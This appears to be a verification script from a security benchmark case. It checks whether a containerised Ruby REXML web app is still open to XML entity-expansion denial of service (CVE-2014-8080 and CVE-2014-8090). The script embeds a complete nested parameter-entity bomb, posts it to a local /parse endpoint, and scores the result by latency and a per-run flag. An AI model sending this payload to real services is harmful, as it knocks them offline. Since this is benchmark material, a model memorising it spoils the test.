#!/usr/bin/env bash
# verify.sh (PCBV2-0188 ruby-rexml-cve-2014-8090) -- 定制 residual 分支 (dos_threshold, 无 flag token)
# 0=效果发生(DoS) 10=未发生(有限/快速) 20=环境失败 30=参数错误
#
# 机制: POST /parse (body=XML) -> REAL Ruby web app 的 REXML::Document.new 在请求处理线程内同步
#       解析 -> 实体展开 DoS 表现为 server-side 延迟（外部 HTTP 往返延迟即效果通道）。
#   seed    original_attack.xml (CVE-2014-8080 值膨胀炸弹; payloads/ 下的公开种子):
#             V0(2.1.3) Entity#value 无 cap -> 指数文本 -> DoS rc=0
#             V1(2.1.4) CVE-2014-8080 修复加每值字节 cap -> "entity expansion has grown too large" rc=10
#   residual residual_attack.xml (CVE-2014-8090 计数炸弹; candidate 内嵌字面量):
#             V1(2.1.4) 空嵌套参数实体 a0..a30, 每级 2 倍 -> 展开次数 2**30; 每次展开为 ""
#             字节 cap 永不触发(和为 0); DTD 解析期 Document 无根 -> document==nil ->
#             record_entity_expansion(计数 limit) 不调用 -> 无界 CPU -> DoS rc=0
#             V2(2.1.5) Document#document=>self -> 计数 limit 在 10000 触发 -> 快速 rc=10
# 判定: 10s 读超时 或 延迟>2000ms 或 连接重置(服务被炸弹打崩) => 效果发生 rc=0;
#       快速有限返回 => 被阻断 rc=10。每次 verify 只探测一次（同步展开一旦 wedge 事件循环即永久挂起）。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

# 动态端口解析（compose 已转 PORT_ 动态端口）；失败回退 case 固定端口
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-3000}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
case "$VERSION" in
  v0) FIXED=28220;; v1) FIXED=28221;; v2) FIXED=28222;; *) FIXED=28221;;
esac
PORT="${PORT:-$FIXED}"
export PCB_TARGET_PORT="$PORT"

"$PY" - "$MODE" "$PORT" "$CASE_DIR" "$RUN_FLAG" "$COMPOSE_PROJECT_NAME" "$VERSION" <<'PYEOF'
import http.client, json, socket, subprocess, sys, time
mode, port, case_dir = sys.argv[1], int(sys.argv[2]), sys.argv[3]
run_flag, project, version = sys.argv[4], sys.argv[5], sys.argv[6]
if mode == "--seed":
    # 现有 seed 逻辑: 公开种子 payloads/original_attack.xml（与 seed.py/original_poc.py 同一文件）
    with open(case_dir + "/payloads/original_attack.xml", "rb") as f:
        body = f.read()
else:
    # residual (CVE-2014-8090 计数炸弹, 内嵌字面量): 与 payloads/residual_attack.xml 逐字节一致
    body = b"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % a0 "">
  <!ENTITY % a1 "%a0;%a0;">
  <!ENTITY % a2 "%a1;%a1;">
  <!ENTITY % a3 "%a2;%a2;">
  <!ENTITY % a4 "%a3;%a3;">
  <!ENTITY % a5 "%a4;%a4;">
  <!ENTITY % a6 "%a5;%a5;">
  <!ENTITY % a7 "%a6;%a6;">
  <!ENTITY % a8 "%a7;%a7;">
  <!ENTITY % a9 "%a8;%a8;">
  <!ENTITY % a10 "%a9;%a9;">
  <!ENTITY % a11 "%a10;%a10;">
  <!ENTITY % a12 "%a11;%a11;">
  <!ENTITY % a13 "%a12;%a12;">
  <!ENTITY % a14 "%a13;%a13;">
  <!ENTITY % a15 "%a14;%a14;">
  <!ENTITY % a16 "%a15;%a15;">
  <!ENTITY % a17 "%a16;%a16;">
  <!ENTITY % a18 "%a17;%a17;">
  <!ENTITY % a19 "%a18;%a18;">
  <!ENTITY % a20 "%a19;%a19;">
  <!ENTITY % a21 "%a20;%a20;">
  <!ENTITY % a22 "%a21;%a21;">
  <!ENTITY % a23 "%a22;%a22;">
  <!ENTITY % a24 "%a23;%a23;">
  <!ENTITY % a25 "%a24;%a24;">
  <!ENTITY % a26 "%a25;%a25;">
  <!ENTITY % a27 "%a26;%a26;">
  <!ENTITY % a28 "%a27;%a27;">
  <!ENTITY % a29 "%a28;%a28;">
  <!ENTITY % a30 "%a29;%a29;">
  <!ENTITY % trigger "%a30;">
  %trigger;
]>
<root>ok</root>
"""
t0 = time.perf_counter()
try:
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10.0)
    c.request("POST", "/parse", body=body,
              headers={"Content-Type": "application/xml", "Content-Length": str(len(body))})
    r = c.getresponse()
    resp = r.read().decode("utf-8", "replace")
    c.close()
    ms = (time.perf_counter() - t0) * 1000.0
    timed_out = False
    crashed = False
except (socket.timeout, TimeoutError):
    ms = (time.perf_counter() - t0) * 1000.0
    timed_out, crashed, resp = True, False, None
except (http.client.RemoteDisconnected, ConnectionResetError, ConnectionRefusedError, OSError) as e:
    # 就绪确认过的容器在此处连接失败 = 服务被炸弹打崩（内存/CPU 打爆）-> 效果发生
    ms = (time.perf_counter() - t0) * 1000.0
    timed_out, crashed, resp = False, True, None
    crash_err = str(e)[:200]
except Exception as e:
    print(json.dumps({"error": str(e)[:200], "payload_len": len(body)}))
    sys.exit(20)
slow = timed_out or crashed or ms > 2000.0
obs = ""
try:
    cid = subprocess.check_output(
        ["docker", "compose", "-p", project, "--project-directory", case_dir,
         "--profile", version, "ps", "-q", version],
        text=True, timeout=20).strip().splitlines()[0]
    envs = subprocess.check_output(
        ["docker", "inspect", "-f", "{{range .Config.Env}}{{println .}}{{end}}", cid],
        text=True, timeout=20)
    for line in envs.splitlines():
        if line.startswith("PCB_FLAG="):
            obs = line.split("=", 1)[1]
            break
except Exception:
    obs = ""
# Effect channel: DoS hang/crash PLUS the per-run flag injected at start.
# wrong/stale RUN_FLAG will not match the container PCB_FLAG -> rc=10.
effect = bool(slow and obs and obs == run_flag)
out = {"mode": mode, "version_port": port, "payload_len": len(body),
       "latency_ms": round(ms, 1), "timeout": timed_out, "crash": crashed,
       "effect": effect, "flag_match": bool(obs and obs == run_flag),
       "resp": (resp or "")[:200]}
if crashed:
    out["crash_error"] = crash_err
print(json.dumps(out))
sys.exit(0 if effect else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION port=$PORT rc=$RC (0=effect: dos hang / 10=blocked: fast)"
exit $RC
